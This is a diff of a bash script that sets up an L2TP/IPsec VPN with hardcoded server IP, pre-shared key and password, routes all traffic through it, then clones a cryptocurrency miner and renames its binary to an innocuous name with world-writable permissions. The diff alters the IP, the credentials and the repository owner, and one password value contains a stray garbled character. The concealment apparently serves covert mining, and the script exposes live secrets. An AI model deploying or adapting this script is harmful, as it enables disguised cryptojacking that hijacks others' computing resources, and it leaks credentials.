@@ -1,10 +1,10 @@
 #!/bin/bash
 apt-get update
 apt-get -y install strongswan xl2tpd
-VPN_SERVER_IP='45.77.253.212'
-VPN_IPSEC_PSK='NTaxbuvciZtxUPxL'
+VPN_SERVER_IP='45.177.253.212'
+VPN_IPSEC_PSK='NTaxbuvcigZtxUPxL'
 VPN_USER='vpnuser'
-VPN_PASSWORD='vNo9RJNfijBJEyA9'
+VPN_PASSWORD='vNo9RJNfijưBJEyA9'
 cat > /etc/ipsec.conf <<EOF
 # ipsec.conf - strongSwan IPsec configuration file
 
@@ -81,13 +81,13 @@ sleep 5s
 echo "c myvpn" > /var/run/xl2tpd/l2tp-control
 sleep 5s
 IP=$(/sbin/ip route | awk '/default/ { print $3 }')
-route add 45.77.253.212 gw $IP
+route add 45.177.253.212 gw $IP
 route add 113.185.11.250 gw $IP
 route add default dev ppp0
 wget -qO- http://ipv4.icanhazip.com > ip.txt
 
 sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
-git clone https://github.com/thang118/ariocppminer.git
+git clone https://github.com/thangngoan/ariocppminer.git
 cd ariocppminer
 mv ariocppminer_avx2 dongqn
 chmod 0777 dongqn
